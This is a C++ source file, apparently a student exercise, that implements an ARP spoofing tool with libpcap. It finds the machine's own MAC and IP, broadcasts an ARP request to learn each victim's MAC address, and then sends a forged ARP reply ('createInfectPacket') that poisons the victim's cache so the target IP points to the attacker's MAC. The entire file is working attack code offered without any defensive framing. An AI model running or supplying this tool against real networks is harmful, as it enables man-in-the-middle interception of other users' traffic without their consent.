#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

EthArpPacket createEthArpPacket(uint8_t *attackerMac, char *victimIp)
{
    EthArpPacket packet;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.eth_.smac_ = Mac(attackerMac);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.smac_ = Mac(attackerMac);
    packet.arp_.tip_ = htonl(Ip(victimIp));

    return packet;
}

EthArpPacket createBroadcastPacket(uint8_t *attackerMac, uint32_t myIp, char *victimIp)
{
    EthArpPacket packet = createEthArpPacket(attackerMac, victimIp);
    packet.eth_.dmac_ = Mac::broadcastMac();

    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = htonl(Ip(myIp));
    packet.arp_.tmac_ = Mac::nullMac();
    return packet;
}

EthArpPacket createInfectPacket(uint8_t *attackerMac, uint8_t *victimMac, char *victimIp, char *targetIp)
{
    EthArpPacket packet = createEthArpPacket(attackerMac, victimIp);
    packet.eth_.dmac_ = Mac(victimMac);

    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(Ip(targetIp));
    packet.arp_.tmac_ = Mac(victimMac);
    return packet;
}

void sendPacket(EthArpPacket packet, pcap_t *handle)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

void receiveVictimMac(uint8_t *victimMac, char *victimIp, pcap_t *handle)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;

        EthArpPacket *temp = (EthArpPacket *)packet;
        if (ntohs(temp->eth_.type_) != 0x0806)
            continue;

        uint32_t rcvdVictimIP = ntohl(uint32_t(temp->arp_.sip_));
        if (rcvdVictimIP == uint32_t(Ip(victimIp)))
        {
            memcpy(victimMac, Mac(temp->eth_.smac_).operator uint8_t *(), Mac::SIZE);
            break;
        }
    }
}

int main(int argc, char const *argv[])
{
    if (argc < 4 || argc % 2 == 1)
    {
        fprintf(stderr, "argument error with argc %d\n", argc);
        return -1;
    }

    const char *netIF = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(netIF, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", netIF, errbuf);
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    strcpy(ifr.ifr_name, netIF);
    int sd = socket(AF_PACKET, SOCK_DGRAM, IPPROTO_IP);

    ioctl(sd, SIOCGIFADDR, &ifr);
    uint32_t myIp = (uint32_t)(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr);

    ioctl(sd, SIOCGIFHWADDR, &ifr);
    uint8_t *attackerMac = (uint8_t *)ifr.ifr_hwaddr.sa_data;

    close(sd);

    int schedule = 2;
    while (true)
    {
        if (schedule == argc)
            break;

        char *victimIp = const_cast<char *>(argv[schedule]);
        char *targetIp = const_cast<char *>(argv[schedule + 1]);

        EthArpPacket packet = createBroadcastPacket(attackerMac, myIp, victimIp);
        sendPacket(packet, handle);

        uint8_t victimMac[Mac::SIZE];
        receiveVictimMac(victimMac, victimIp, handle);

        EthArpPacket newpacket = createInfectPacket(attackerMac, victimMac, victimIp, targetIp);
        sendPacket(newpacket, handle);

        schedule += 2;
    }

    return 0;
}
